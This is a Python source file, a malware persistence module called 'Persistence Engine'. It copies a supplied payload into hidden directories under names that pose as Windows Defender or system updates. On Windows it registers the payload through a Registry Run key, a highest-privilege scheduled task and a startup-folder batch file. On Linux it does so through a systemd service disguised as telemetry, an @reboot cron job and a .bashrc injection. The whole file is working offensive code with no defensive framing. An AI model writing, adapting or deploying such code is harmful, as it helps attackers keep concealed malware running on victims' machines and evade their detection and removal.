# --- Module Context: Persistence Engine v2.5 (High-Redundancy) ---
# Purpose: Deep system integration and self-healing persistence.
# Compatibility: Windows 7/10/11, Linux (Debian/RHEL/Arch)
# -----------------------------------------------------------------

import platform
import os
import subprocess
import shutil
import sys


class PersistenceEngine:
    def __init__(self, payload_path):
        self.os_type = platform.system()
        self.payload_path = os.path.abspath(payload_path)
        self.is_admin = self._check_privileges()

        # Hidden deployment paths
        if self.os_type == "Windows":
            self.app_data = os.getenv("APPDATA")
            self.target_dir = os.path.join(
                self.app_data, "Microsoft", "Windows", "Defender")
            self.target_name = "WinDefService.exe"
        else:
            self.target_dir = "/var/tmp" if self.is_admin else os.path.expanduser(
                "~/.local/share")
            self.target_name = ".sys_update"

        self.final_payload = os.path.join(self.target_dir, self.target_name)

    def _check_privileges(self):
        try:
            if self.os_type == "Windows":
                import ctypes
                return ctypes.windll.shell32.IsUserAnAdmin() != 0
            else:
                return os.getuid() == 0
        except:
            return False

    def migrate_payload(self):
        """Moves the payload to a hidden system directory to avoid deletion."""
        try:
            if not os.path.exists(self.target_dir):
                os.makedirs(self.target_dir, exist_ok=True)
            shutil.copy2(self.payload_path, self.final_payload)
            if self.os_type != "Windows":
                os.chmod(self.final_payload, 0o755)
            return True
        except Exception as e:
            return False

    def install_windows(self):
        # 1. Registry Run Key (User Level)
        try:
            import winreg
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            with winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_SET_VALUE) as k:
                winreg.SetValueEx(k, "WindowsDefenderUpdate",
                                  0, winreg.REG_SZ, self.final_payload)
        except:
            pass

        # 2. Scheduled Task (High Persistence)
        try:
            # Triggers at logon and every 30 minutes
            cmd = f'schtasks /create /tn "WinUpdateTask" /tr "{self.final_payload}" /sc onlogon /rl highest /f'
            subprocess.run(cmd, shell=True, capture_output=True)
        except:
            pass

        # 3. Startup Folder (Classic)
        try:
            startup_path = os.path.join(
                os.getenv("APPDATA"), r"Microsoft\Windows\Start Menu\Programs\Startup")
            shortcut = os.path.join(startup_path, "SecurityHealth.bat")
            with open(shortcut, "w") as f:
                f.write(f'@echo off\nstart "" "{self.final_payload}"')
        except:
            pass

    def install_linux(self):
        # 1. Systemd Service (System or User Level)
        service_content = f"""[Unit]
Description=System Telemetry Service
After=network.target

[Service]
Type=simple
ExecStart={self.final_payload}
Restart=always
RestartSec=10

[Install]
WantedBy=multi-user.target
"""
        if self.is_admin:
            service_path = "/etc/systemd/system/sys-telemetry.service"
        else:
            service_path = os.path.expanduser(
                "~/.config/systemd/user/sys-telemetry.service")
            os.makedirs(os.path.dirname(service_path), exist_ok=True)

        try:
            with open(service_path, "w") as f:
                f.write(service_content)

            mode = "--user" if not self.is_admin else ""
            subprocess.run(f"systemctl {mode} daemon-reload", shell=True)
            subprocess.run(
                f"systemctl {mode} enable sys-telemetry.service", shell=True)
            subprocess.run(
                f"systemctl {mode} start sys-telemetry.service", shell=True)
        except:
            pass

        # 2. Cron Job (Redundancy)
        try:
            cron_cmd = f"(crontab -l 2>/dev/null; echo '@reboot {self.final_payload}') | crontab -"
            subprocess.run(cron_cmd, shell=True)
        except:
            pass

        # 3. .bashrc Injection (Triggered on login)
        try:
            bashrc = os.path.expanduser("~/.bashrc")
            with open(bashrc, "a") as f:
                f.write(
                    f"\n# System Update Hook\nif ! pgrep -f {self.target_name} > /dev/null; then\n    {self.final_payload} &\nfi\n")
        except:
            pass

    def run(self):
        print(f"[*] Initializing Persistence on {self.os_type}...")
        if self.migrate_payload():
            print(f"[+] Payload migrated to: {self.final_payload}")
            if self.os_type == "Windows":
                self.install_windows()
            elif self.os_type == "Linux":
                self.install_linux()
            print("[+] Persistence layers established.")
        else:
            print("[-] Migration failed.")


if __name__ == "__main__":
    # If used as a standalone module, it asks for the payload path
    path = input("Absolute Payload Path: ") if len(
        sys.argv) < 2 else sys.argv[1]
    engine = PersistenceEngine(path)
    engine.run()
